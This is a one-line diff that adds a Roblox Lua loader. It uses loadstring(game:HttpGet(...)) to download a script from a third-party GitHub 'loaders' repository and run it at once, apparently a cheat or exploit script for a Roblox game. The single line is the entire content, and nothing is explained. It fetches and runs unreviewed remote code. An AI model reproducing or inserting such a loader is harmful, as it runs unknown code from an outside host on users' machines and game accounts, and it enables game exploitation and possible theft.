@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/slayers-2-spam4-0tw6z8vwewh0c9.lua"))()
